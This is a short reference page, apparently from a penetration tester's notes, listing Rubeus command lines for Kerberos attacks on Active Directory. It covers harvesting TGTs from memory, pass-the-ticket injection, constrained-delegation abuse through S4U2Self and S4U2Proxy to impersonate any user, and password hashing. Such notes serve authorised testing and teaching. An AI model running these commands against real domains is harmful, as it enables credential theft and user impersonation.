# [Rubeus](https://github.com/GhostPack/Rubeus)

---

## [Usage & Flags for Each of Rubeus's Commands](https://github.com/GhostPack/Rubeus)

---

## Listen for and Extract TGTs from Memory at a Particular Interval (Exploiting [[unconstrained-delegation|Unconstrained Delegation]])

Must be executed in the context of `NT AUTHORITY/SYSTEM`.

```powershell
Rubeus.exe monitor /monitorinterval:"$INTERVAL_IN_SECONDS" [/runfor:"$NUMBER_OF_SECONDS_TO_RUN_FOR"]
```

---

## Inject a Kerberos ticket into the Current Context to Execute a [[pass-the-ticket|Pass the Ticket]] Attack

```powershell
Rubeus.exe ptt /ticket:$TICKET
```

- `$TICKET` can either be a base64-encoded TGT or service ticket string or a path to a file containing the TGT or service ticket

---

## Abuse a [[constrained-delegation|Constrained Delegation]] Privilege to Generate a Service Ticket for Any User to a Host for which a SPN is Configured

### 1. Retrieve a TGT for the principal configured with constrained delegation

```powershell
Rubeus.exe [/domain:"$DOMAIN"] /user:"$USERNAME" [/rc4:"$RC4"] [/aes128:"$AES128"] [/aes256:"$AES256"] [/des:"$DES"] [/password:"$PASSWORD"] [/dc:$DOMAIN_CONTROLLER_FQDN_OR_IP] 
```

- `$DOMAIN/$USER` is the domain and username of the principal who has the constrained delegation privilege on `$SPN`
- `$RC4`, `$AES128`, `$AES256`, `$DES`, or `$PASSWORD` is the credential of the principal who has the constrained delegation privilege on `$SPN`

### 2. Retrieve a service ticket for the user to impersonate to the principal configured with constrained delegation (S4U2Self)

```powershell
Rubeus.exe s4u [/ticket:"$TGT"] /impersonateuser:"$USER_TO_IMPERSONATE"
```

- `$TGT` was generated in step \#1
	- Either the base64-encoded string or a path to a file containing the ticket

### 3. Retrieve a service ticket for the user to impersonate to one of the SPNs available to the principal configured with constrained delegation (S4U2Proxy)

```powershell
Rubeus.exe s4u [/ticket:"$TGT"] /msdsspn:"$SPN" /tgs:"$SERVICE_TICKET" [/altservice:"$ALTERNATIVE_SERVICE"] [/ptt]
```

- `$SPN`: [[service-principal-name|SPN]] to retrieve the new service ticket for
- `$SERVICE_TICKET` from step \#2
	- Either the base64-encoded string or a path to a file containing the ticket
- `$ALTERNATIVE_SERVICE`: an alternative service to create the new service ticket for, instead of the service from the `$SPN` (i.e., `cifs`, `ldap`, etc.)
- `/ptt` will inject the ticket into the current context. Otherwise, print it to `stdout`


### 4. [[windows/active-directory/tools/rubeus#Inject a Kerberos ticket into the Current Context to Execute a pass-the-ticket Pass the Ticket Attack|Inject the ticket into the current context to execute a pass the ticket attack]]

---

## Generate the RC4 HMAC of a Domain Account's Password

```powershell
Rubeus.exe hash /password:$PASSWORD /user:$USERNAME /domain:$DOMAIN
```
